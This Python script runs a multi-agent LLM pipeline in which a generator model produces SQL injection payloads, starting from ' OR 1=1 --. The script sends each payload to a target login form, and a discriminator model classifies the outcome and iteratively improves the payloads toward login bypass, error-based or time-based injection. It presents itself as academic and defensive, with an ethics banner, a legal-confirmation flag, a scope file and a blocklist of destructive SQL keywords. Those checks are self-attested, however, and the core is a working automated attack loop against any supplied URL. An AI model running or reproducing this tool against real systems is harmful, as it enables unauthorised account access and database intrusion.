#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
updated_multi_agent.py

Safe-by-default multi-agent LLM pipeline to explore *defensive* SQLi payload generation
and appraisal under explicit legal authorization. Designed for academic research
only (e.g., vulnerability study on testbeds you own or have written permission to test).

Key features:
- Generator/Discriminator agents (Ollama/OpenAI via autogen) with your llm_config.
- Strict ethics guardrails (requires --confirm-legal and a readable --scope file).
- Deterministic, structured logs (CSV + JSONL), plus artifact snapshotting.
- Resilient HTTP test harness with rate-limiting, timeout handling, and truncation.
- Reproducible experimental runs (seed, config capture).
- "Dataset" vs "improved" seed modes, plus "single" payload seed.
- Single-endpoint login probe only (username=<payload>, password=constant) to confine risk.
- Clear test outcome schema for downstream analysis.

USAGE (example):
  python updated_multi_agent.py \\
    --url https://target.example/login.php \\
    --iterations 5 \\
    --payloads-per-iteration 5 \\
    --seed-mode dataset \\
    --output datasets/multi_agent_output/conversation_dataset.csv \\
    --jsonl datasets/multi_agent_output/conversation_dataset.jsonl \\
    --scope scope.txt \\
    --confirm-legal

Scope file sample (scope.txt):
  # One or more lines describing authorization & target(s)
  I have written permission to test https://target.example by <Org/Owner>, ticket ABC-123.

"""

import argparse
import csv
import json
import os
import re
import sys
import time
import uuid
import random
import signal
import hashlib
from datetime import datetime
from typing import List, Dict, Any, Optional

# === Third-party / your project imports ===
# autogen must be installed and configured (or Ollama running if using ollama backends).
from autogen import AssistantAgent

# Local helpers (as in your repo layout)
from utils.llm_config import vicuna, mistral_lowtemp, vicuna_lowtemp, mistral  # type: ignore
from utils.cleaner import clean_payload  # type: ignore
from utils.test_payload import test_payload  # type: ignore

# -------- Constants / Safety guards --------
DEFAULT_PASSWORD = "password"
DEFAULT_TIMEOUT = 30
DEFAULT_RATE_LIMIT_SEC = 1.0
MAX_BODY_SNAPSHOT = 2000  # chars

SAFE_SQL_TERMS = {"select", "union", "or", "--", ";", "'", "and", "sleep"}
BLOCKED_TERMS = {
    # hard-stop for destructive queries or out-of-scope vectors
    "drop ", "alter ", "truncate ", "delete ", "xp_", "exec ", "sp_", "outfile",
    "dumpfile", "union select into", "information_schema.processlist"
}

ETHICS_BANNER = r"""
================================================================================
  ETHICAL & LEGAL USE REQUIRED

  • You must have explicit authorization (written permission) to test the target.
  • This tool is limited to a single login POST flow to reduce risk surface.
  • It is prohibited to use this tool against systems you do not own/operate
    or without documented permission from the owner/custodian.

  The program will not run unless:
    --confirm-legal  AND a readable --scope file are provided.

  Proceed responsibly. All actions are logged.
================================================================================
"""

# ----------------- Helpers -----------------
def sha1(s: str) -> str:
    return hashlib.sha1(s.encode("utf-8")).hexdigest()

def ensure_dir(path: str):
    os.makedirs(os.path.dirname(path), exist_ok=True)

def load_seed_payloads(path: Optional[str]) -> List[str]:
    """
    Load seed payloads from a CSV file containing a 'payload' column.
    If path is None or file missing/invalid, return a minimal default list.
    """
    if not path or not os.path.exists(path):
        return ["' OR 1=1 --"]
    payloads = set()
    try:
        with open(path, newline="", encoding="utf-8") as f:
            reader = csv.DictReader(f)
            for row in reader:
                p = (row.get("payload") or "").strip()
                if p:
                    payloads.add(p)
    except Exception:
        return ["' OR 1=1 --"]
    return list(payloads)[:50] or ["' OR 1=1 --"]

def validate_payload(payload: str) -> bool:
    if not isinstance(payload, str) or not payload.strip():
        return False
    p = payload.lower()
    if any(term in p for term in BLOCKED_TERMS):
        return False
    return any(term in p for term in SAFE_SQL_TERMS)

def truncate_txt(s: str, n: int) -> str:
    return s if len(s) <= n else s[:n] + f"... [truncated {len(s)-n} chars]"

def now_iso() -> str:
    return datetime.utcnow().replace(microsecond=0).isoformat() + "Z"

def read_scope(path: str) -> str:
    with open(path, "r", encoding="utf-8") as f:
        return f.read().strip()

def save_json(path: str, obj: Any):
    ensure_dir(path)
    with open(path, "w", encoding="utf-8") as f:
        json.dump(obj, f, indent=2, ensure_ascii=False)

def append_jsonl(path: str, obj: Dict[str, Any]):
    ensure_dir(path)
    with open(path, "a", encoding="utf-8") as f:
        f.write(json.dumps(obj, ensure_ascii=False) + "\n")

# ------------- Agent factory ---------------
def create_generator_agent() -> AssistantAgent:
    # Use the higher-temp model for creativity
    return AssistantAgent(name="GeneratorAgent", llm_config=vicuna)

def create_discriminator_agent() -> AssistantAgent:
    # Use low temp for crisp JSON output
    return AssistantAgent(
        name="DiscriminatorAgent",
        system_message=(
            "You are a security testing expert.\n"
            "Return ONLY a valid JSON object with fields:\n"
            "classification, reasoning, improvement, improved_payload.\n"
            "Do NOT add markdown, commentary, or quotes outside the JSON.\n"
            "classification must be one of:\n"
            "[\"Login Bypass\",\"Error-based SQL Injection\",\"Time-based SQL Injection\",\"No Effect\",\"Invalid Payload\"].\n"
        ),
        llm_config=mistral_lowtemp
    )

# -------- Prompt builders ----------
def build_generation_prompt(base_payloads: List[str], payload_count: int, conservative: bool) -> str:
    guards = (
        "- Avoid destructive keywords (DROP, ALTER, TRUNCATE, DELETE) or file writes.\n"
        "- Restrict to login-bypass style SQL injection candidates only.\n"
        "- Do not include database-specific admin routines.\n"
    )
    return (
        "Modify these payloads to increase *defensive test* effectiveness ONLY for login field fuzzing:\n"
        f"{os.linesep.join(base_payloads)}\n\n"
        f"Output {payload_count} unique raw SQL injection payloads:\n"
        "- Raw payload only, one per line.\n"
        "- No numbering, no commentary, no markdown.\n"
        f"{guards if conservative else ''}"
    )

def build_discriminator_prompt(payload: str, http_status: int, elapsed: float,
                               last_working: str) -> str:
    return (
        f"Payload: {payload}\n"
        f"HTTP Status: {http_status}\n"
        f"Response Time: {elapsed:.2f}s\n\n"
        f"Last working payload (for fallback): {last_working}\n\n"
        "If this payload failed, improve using last working payload as base.\n"
        "Otherwise, improve this payload directly.\n\n"
        "Return JSON ONLY with keys:\n"
        "- classification (string)\n"
        "- reasoning (string)\n"
        "- improvement (string)\n"
        "- improved_payload (string)\n"
    )

def extract_json(content: str) -> Optional[Dict[str, Any]]:
    c = re.sub(r"```[a-zA-Z]*", "", content).replace("```", "").strip()
    m = re.search(r"\{.*\}", c, re.DOTALL)
    if not m:
        return None
    try:
        return json.loads(m.group(0))
    except json.JSONDecodeError:
        return None

# ------------- Runner ---------------
def run_generator(generator: AssistantAgent,
                  base_payloads: List[str],
                  payload_count: int,
                  conservative: bool) -> List[str]:
    prompt = build_generation_prompt(base_payloads, payload_count, conservative)
    reply = generator.generate_reply(messages=[{"role": "user", "content": prompt}], max_tokens=768)
    lines = (reply.get("content") or "").splitlines()
    out = []
    for line in lines:
        p = clean_payload(line)
        if p:
            out.append(p)
    # quick dedupe & guard
    uniq = []
    seen = set()
    for p in out:
        if p in seen:
            continue
        seen.add(p)
        uniq.append(p)
    return uniq

def run_discriminator(discriminator: AssistantAgent,
                      payload: str,
                      http_status: int,
                      elapsed: float,
                      last_working: str,
                      retries: int = 1) -> Dict[str, Any]:
    prompt = build_discriminator_prompt(payload, http_status, elapsed, last_working)
    for _ in range(retries + 1):
        resp = discriminator.generate_reply(messages=[{"role": "user", "content": prompt}], max_tokens=768)
        parsed = extract_json((resp.get("content") or "").strip())
        if parsed:
            return parsed
        prompt = "Your last output was invalid. Return ONLY valid JSON with the required keys."
    return {
        "classification": "ParseError",
        "reasoning": (resp.get("content") or ""),
        "improvement": "Retry improvement",
        "improved_payload": "' OR 1=1 --"
    }

def graceful_sigint():
    # Ensure Ctrl+C stops cleanly after current request
    stop = {"flag": False}
    def handler(signum, frame):
        stop["flag"] = True
        print("\n[!] Interrupted — finishing current step and exiting...")
    signal.signal(signal.SIGINT, handler)
    return stop

# ------------- Main loop -------------
def run_experiment(
    url: str,
    iterations: int,
    payloads_per_iteration: int,
    output_file: str,
    jsonl_file: str,
    seed_mode: str,
    seed_csv: Optional[str],
    rate_limit: float,
    truncate_body: int,
    conservative: bool,
    scope_text: str,
    random_seed: Optional[int] = None,
    start_with: Optional[str] = None,
) -> Dict[str, Any]:

    if random_seed is not None:
        random.seed(random_seed)

    ensure_dir(output_file)
    ensure_dir(jsonl_file)

    # Save a run manifest for reproducibility
    run_id = str(uuid.uuid4())
    manifest = {
        "run_id": run_id,
        "created": now_iso(),
        "url": url,
        "iterations": iterations,
        "payloads_per_iteration": payloads_per_iteration,
        "seed_mode": seed_mode,
        "seed_csv": seed_csv,
        "rate_limit_sec": rate_limit,
        "truncate_body_chars": truncate_body,
        "conservative": conservative,
        "scope_sha1": sha1(scope_text),
        "random_seed": random_seed,
        "version": "updated_multi_agent.py/1.0.0",
    }
    save_json(os.path.splitext(output_file)[0] + ".manifest.json", manifest)

    generator = create_generator_agent()
    discriminator = create_discriminator_agent()

    # Seed payloads
    if seed_mode == "dataset":
        seed_payloads = load_seed_payloads(seed_csv)
    elif seed_mode == "single":
        seed_payloads = [start_with or "' OR 1=1 --"]
    elif seed_mode == "improved":
        seed_payloads = ["' OR 1=1 --"]  # will be replaced after first improvement
    else:
        raise ValueError("seed_mode must be one of: dataset|single|improved")

    prev_payloads = set()
    improved_payload_bank: List[str] = []
    last_working_payload = "' OR 1=1 --"

    # CSV setup
    first_write = not os.path.exists(output_file)
    csvfile = open(output_file, "a", newline="", encoding="utf-8")
    writer = csv.DictWriter(csvfile, fieldnames=[
        "run_id", "iteration", "payload", "classification", "reasoning",
        "improvement", "improved_payload", "test_status", "rt_sec", "ts"
    ])
    if first_write:
        writer.writeheader()

    stop = graceful_sigint()

    try:
        for i in range(iterations):
            if stop["flag"]:
                break
            print(f"\n=== Iteration {i+1}/{iterations} ===")

            if seed_mode == "improved" and improved_payload_bank:
                base_payloads = improved_payload_bank[-min(5, len(improved_payload_bank)):]
            else:
                base_payloads = seed_payloads

            # Generate
            raw_payloads = run_generator(generator, base_payloads, payloads_per_iteration, conservative)
            # Sanitize & filter
            payloads = []
            for p in raw_payloads:
                p = clean_payload(p)
                if not p or p in prev_payloads:
                    continue
                if not validate_payload(p):
                    continue
                payloads.append(p)
                prev_payloads.add(p)

            if not payloads:
                print("[!] No valid payloads produced; falling back to default.")
                payloads = ["' OR 1=1 --"]

            # Test each payload (login POST only) and ask discriminator
            for p in payloads:
                if stop["flag"]:
                    break

                # Rate limit
                time.sleep(max(rate_limit, 0))

                t0 = time.time()
                http_resp = test_payload(
                    p,
                    start_time=t0,
                    url=url,
                    return_http_response=True,
                    truncate_body=truncate_body
                )
                elapsed = max(0.0, time.time() - t0)
                status = getattr(http_resp, "status_code", 0)

                parsed = run_discriminator(
                    discriminator, p, status, elapsed, last_working_payload, retries=1
                )

                # Track improvement chain
                improved = clean_payload(parsed.get("improved_payload", "") or "")
                if improved and validate_payload(improved):
                    improved_payload_bank.append(improved)
                    last_working_payload = improved

                row = {
                    "run_id": run_id,
                    "iteration": i + 1,
                    "payload": p,
                    "classification": parsed.get("classification", "Unknown"),
                    "reasoning": parsed.get("reasoning", ""),
                    "improvement": parsed.get("improvement", ""),
                    "improved_payload": improved or "",
                    "test_status": status,
                    "rt_sec": round(elapsed, 3),
                    "ts": now_iso(),
                }
                writer.writerow(row)
                csvfile.flush()

                append_jsonl(jsonl_file, {
                    **row,
                    "http_snapshot": {
                        "status": status,
                        # Response text truncated inside test_payload already if requested;
                        # include no headers/body here to minimize risk of storing PII.
                    }
                })

                print(f"  • {p!r} -> {status} [{parsed.get('classification')}] "
                      f"improved: {truncate_txt(improved, 64)!r}")
    finally:
        csvfile.close()

    print("\n[✓] Run complete.")
    return {"run_id": run_id, "output_csv": output_file, "output_jsonl": jsonl_file}

# ------------- CLI -------------
def parse_args():
    ap = argparse.ArgumentParser(
        description="Multi-agent LLM pipeline (safe-by-default) for academic SQLi payload research."
    )
    ap.add_argument("--url", required=True, help="Target login URL (authorized test target).")
    ap.add_argument("--iterations", type=int, default=5, help="Number of generator/discriminator cycles.")
    ap.add_argument("--payloads-per-iteration", type=int, default=5, help="Number of payloads per generator output.")
    ap.add_argument("--output", default="datasets/multi_agent_output/conversation_dataset.csv",
                    help="CSV output path.")
    ap.add_argument("--jsonl", default="datasets/multi_agent_output/conversation_dataset.jsonl",
                    help="JSONL output path.")
    ap.add_argument("--seed-mode", choices=["dataset", "single", "improved"], default="dataset",
                    help="Seed strategy.")
    ap.add_argument("--seed-csv", default="datasets/multi_agent_output/discriminator(2)_results_sql_payloads.csv",
                    help="CSV with a 'payload' column (for seed-mode=dataset).")
    ap.add_argument("--start-with", default=None, help="Seed payload (for seed-mode=single).")
    ap.add_argument("--rate-limit", type=float, default=DEFAULT_RATE_LIMIT_SEC,
                    help="Seconds to sleep between HTTP requests.")
    ap.add_argument("--truncate-body", type=int, default=MAX_BODY_SNAPSHOT,
                    help="Truncate response text (chars) captured by test harness.")
    ap.add_argument("--conservative", action="store_true",
                    help="Stronger guardrails on generation prompt.")
    ap.add_argument("--scope", required=True, help="Path to a human-readable scope/authorization file.")
    ap.add_argument("--confirm-legal", action="store_true",
                    help="Acknowledge you have written authorization for the target.")
    ap.add_argument("--seed", type=int, default=None, help="Random seed for reproducibility.")
    return ap.parse_args()

def main():
    print(ETHICS_BANNER)
    args = parse_args()

    if not args.confirm_legal:
        print("[!] Refusing to run without --confirm-legal. See banner above.")
        sys.exit(2)
    if not os.path.exists(args.scope):
        print("[!] Scope/authorization file not found.")
        sys.exit(2)

    scope_text = read_scope(args.scope)
    if not scope_text or len(scope_text) < 10:
        print("[!] Scope/authorization file appears empty/invalid. Aborting.")
        sys.exit(2)

    try:
        result = run_experiment(
            url=args.url,
            iterations=args.iterations,
            payloads_per_iteration=args.payloads_per_iteration,
            output_file=args.output,
            jsonl_file=args.jsonl,
            seed_mode=args.seed_mode,
            seed_csv=args.seed_csv,
            rate_limit=args.rate_limit,
            truncate_body=max(0, args.truncate_body),
            conservative=args.conservative,
            scope_text=scope_text,
            random_seed=args.seed,
            start_with=args.start_with,
        )
        print(json.dumps(result, indent=2))
    except KeyboardInterrupt:
        print("\n[!] Interrupted.")
        sys.exit(130)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
